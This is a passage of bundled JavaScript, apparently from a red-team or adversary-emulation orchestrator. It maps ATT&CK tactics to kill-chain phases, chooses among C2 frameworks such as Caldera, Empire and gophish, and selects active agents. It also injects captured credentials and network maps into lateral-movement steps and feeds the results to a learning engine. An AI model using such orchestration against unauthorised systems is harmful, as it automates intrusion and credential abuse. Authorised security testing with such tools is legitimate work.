      step.options.phishing_results = plan.sharedContext.phishingResults;
    }
    if (key === "network_map") {
      step.options.targets = plan.sharedContext.networkMap;
    }
  }
}
function buildContextOptions(context, step) {
  const opts = {};
  if (step.requiresContext.includes("captured_credentials") && context.credentials.length > 0) {
    const bestCred = context.credentials.find((c) => !c.usedBy.includes(step.framework)) || context.credentials[0];
    opts._injected_username = bestCred.username;
    opts._injected_password = bestCred.password || bestCred.hash;
  }
  if (step.requiresContext.includes("network_map")) {
    opts._injected_targets = context.networkMap.map((n) => `${n.host}:${n.ports.join(",")}`);
  }
  return opts;
}
function getOrchestrationPlan(planId) {
  return activePlans.get(planId) || null;
}
function listOrchestrationPlans() {
  return Array.from(activePlans.values());
}
function abortOrchestrationPlan(planId) {
  const plan = activePlans.get(planId);
  if (!plan) return null;
  plan.status = "aborted";
  plan.completedAt = (/* @__PURE__ */ new Date()).toISOString();
  for (const step of plan.steps) {
    if (step.status === "pending" || step.status === "waiting") {
      step.status = "skipped";
      plan.stepsSkipped++;
    }
  }
  persistPlanAsync(plan);
  logEntry(plan, "warn", null, null, null, `Orchestration plan "${plan.name}" aborted`);
  return plan;
}
function getOrchestrationStats() {
  const plans = Array.from(activePlans.values());
  const frameworkUsage = {};
  const phaseDistribution = {};
  let totalSteps = 0;
  let totalCompleted = 0;
  let handoffCount = 0;
  for (const plan of plans) {
    for (const step of plan.steps) {
      totalSteps++;
      const fw = step.usedFramework || step.framework;
      frameworkUsage[fw] = (frameworkUsage[fw] || 0) + 1;
      phaseDistribution[step.phase] = (phaseDistribution[step.phase] || 0) + 1;
      if (step.status === "success" || step.status === "fallback") totalCompleted++;
      if (step.status === "fallback") handoffCount++;
    }
  }
  return {
    totalPlans: plans.length,
    activePlans: plans.filter((p) => p.status === "running").length,
    completedPlans: plans.filter((p) => p.status === "completed").length,
    failedPlans: plans.filter((p) => p.status === "failed").length,
    totalSteps,
    frameworkUsage,
    phaseDistribution,
    handoffCount,
    averageCompletionRate: totalSteps > 0 ? Math.round(totalCompleted / totalSteps * 100) : 0
  };
}
function getDefaultFrameworkPriority() {
  return DEFAULT_FRAMEWORK_PRIORITY;
}
function generateId() {
  return "orch-" + Math.random().toString(36).substring(2, 10) + "-" + Date.now().toString(36);
}
function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
function tacticToKillChainPhase(tactic) {
  const map = {
    "reconnaissance": "reconnaissance",
    "resource-development": "weaponization",
    "initial-access": "delivery",
    "execution": "exploitation",
    "persistence": "installation",
    "privilege-escalation": "exploitation",
    "defense-evasion": "installation",
    "credential-access": "actions_on_objectives",
    "discovery": "reconnaissance",
    "lateral-movement": "actions_on_objectives",
    "collection": "actions_on_objectives",
    "command-and-control": "command_and_control",
    "exfiltration": "actions_on_objectives",
    "impact": "actions_on_objectives"
  };
  return map[tactic] || "actions_on_objectives";
}
function selectBestFramework(node, priority) {
  if (node.calderaAbilityId && priority.includes("caldera")) {
    return "caldera";
  }
  if (node.techniqueId && node.platform) {
    const recommendation = recommendFramework(node.techniqueId, node.platform);
    if (recommendation && recommendation.confidence > 70) {
      const recFw = recommendation.framework;
      if (priority.includes(recFw)) return recFw;
    }
  }
  return priority[0] || "caldera";
}
function inferProvidedContext(node) {
  const context = [];
  const tactic = node.tactic.toLowerCase();
  if (tactic.includes("credential")) context.push("captured_credentials");
  if (tactic.includes("discovery")) context.push("network_map", "host_info");
  if (tactic.includes("initial-access")) context.push("initial_foothold");
  if (tactic.includes("persistence")) context.push("persistent_access");
  if (tactic.includes("lateral")) context.push("lateral_access");
  if (tactic.includes("collection")) context.push("collected_data");
  if (tactic.includes("privilege")) context.push("elevated_access");
  return context;
}
function inferRequiredContext(node) {
  const context = [];
  const tactic = node.tactic.toLowerCase();
  if (tactic.includes("lateral")) context.push("captured_credentials", "network_map");
  if (tactic.includes("exfiltration")) context.push("collected_data");
  if (tactic.includes("privilege") && node.preconditions.some((p) => p.key === "credential")) {
    context.push("captured_credentials");
  }
  return context;
}
async function selectAgent(framework, platform, privilege, registry) {
  const adapter = registry.get(framework);
  if (!adapter) return null;
  try {
    const agents = await adapter.listAgents();
    const matching = agents.filter((a) => {
      if (a.status !== "active") return false;
      if (platform && a.platform !== platform) return false;
      if (privilege && a.privileges !== privilege) return false;
      return true;
    });
    if (matching.length === 0) return null;
    matching.sort((a, b) => new Date(b.lastSeen).getTime() - new Date(a.lastSeen).getTime());
    return matching[0].id;
  } catch {
    return null;
  }
}
async function pollForCompletion(framework, taskId, agentId, timeoutMs, registry) {
  const adapter = registry.get(framework);
  if (!adapter) throw new Error(`No adapter for ${framework}`);
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    const result = await adapter.pollResult(taskId, agentId);
    if (result.status !== "pending" && result.status !== "running") {
      return result;
    }
    await sleep(3e3);
  }
  return {
    taskId,
    framework,
    agentId,
    moduleId: "",
    status: "timeout",
    exitCode: -1,
    stdout: "",
    stderr: "Execution timed out",
    startedAt: new Date(start).toISOString(),
    completedAt: (/* @__PURE__ */ new Date()).toISOString()
  };
}
function logEntry(plan, level, phase, stepId, framework, message, details) {
  plan.log.push({
    timestamp: (/* @__PURE__ */ new Date()).toISOString(),
    level,
    phase,
    stepId,
    framework,
    message,
    details
  });
}
async function feedToLearningEngine(step, environment) {
  if (!step.result || step.framework === "gophish") return;
  try {
    const feedback = {
      techniqueId: step.techniqueId || "",
      framework: step.framework,
      taskResult: step.result,
      targetContext: {
        platform: step.targetPlatform || environment.os,
        architecture: "x64",
        hostname: environment.hostname || "unknown",
        privileges: step.requiredPrivilege || environment.privilegeLevel,
        networkSegment: environment.networkAccess
      }
    };
    await processExecutionFeedback(feedback);
  } catch {
  }
}

export {
  EmpireAdapter,
  C2Registry,
  getC2Registry,
  createOrchestrationPlan,
  executeOrchestrationPlan,
  getOrchestrationPlan,
  listOrchestrationPlans,
  abortOrchestrationPlan,
  getOrchestrationStats,
  getDefaultFrameworkPriority
};
